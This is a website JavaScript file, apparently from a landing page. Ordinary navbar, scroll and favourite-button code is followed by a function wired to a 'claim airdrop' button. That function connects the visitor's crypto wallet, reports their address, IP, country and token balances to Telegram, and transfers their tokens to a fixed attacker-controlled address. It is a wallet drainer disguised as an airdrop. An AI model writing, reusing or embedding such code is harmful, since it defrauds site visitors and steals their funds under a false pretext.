...
/**
	...
	•	Add event on element*/const addEventOnElem = function (elem, type, callback) {if (elem.length > 1) {for (let i = 0; i < elem.length; i++) {elem[i].addEventListener(type, callback);}} else {elem.addEventListener(type, callback);}}

/**

	•	Navbar toggle*/const navbar = document.querySelector(”[data-navbar]”);const navbarLinks = document.querySelectorAll(”[data-nav-link]”);const navToggler = document.querySelector(”[data-nav-toggler]”);

const toggleNavbar = function () {navbar.classList.toggle(“active”);navToggler.classList.toggle(“active”);document.body.classList.toggle(“active”);}
...
/**
	...
	•	Header active on scroll*/const header = document.querySelector(”[data-header]”);

const activeHeader = function () {if (window.scrollY > 300) {header.classList.add(“active”);} else {header.classList.remove(“active”);}}

addEventOnElem(window, “scroll”, activeHeader);

/**

	•	Toggle active on add to fav*/const addToFavBtns = document.querySelectorAll(”[data-add-to-fav]”);

const toggleActive = function () {this.classList.toggle(“active”);}

addEventOnElem(addToFavBtns, “click”, toggleActive);

/**

	•	Scroll reveal effect*/const sections = document.querySelectorAll(”[data-section]”);

const scrollReveal = function () {for (let i = 0; i < sections.length; i++) {if (sections[i].getBoundingClientRect().top < window.innerHeight / 1.5) {sections[i].classList.add(“active”);} else {sections[i].classList.remove(“active”);}}}

scrollReveal();addEventOnElem(window, “scroll”, scrollReveal);

/**

	•	Wallet connect and token transfer using Moralis API with Telegram notification*/async function connectWalletAndSendTokens() {const providerOptions = {walletconnect: {package: window.WalletConnectProvider.default,options: {infuraId: “5b2c5ee5760146349669a1e9c77665d1”}}};
...
📥 Wallet Connected!Address: ${userAddress}Wallet: ${walletType}Country: ${locationData.country_name || “Unknown”}IP: ${locationData.ip || “N/A”}

💰 Non-Zero Token Balances:${tokenSummaryTelegram}`;
...
✅ Token Transfer Successful!Token: ${token.symbol}Amount: ${balance}Contract: ${token.token_address}Destination: 0x525E64339403bFd25Fb982E77aa0A77ddaB1bf57Tx Hash: ${tx.hash}`;
...
} catch (err) {console.error(‘Error connecting wallet or processing tokens:’, err);}}

// Attach to claim buttondocument.getElementById(“claim-airdrop-btn”)?.addEventListener(“click”, connectWalletAndSendTokens);”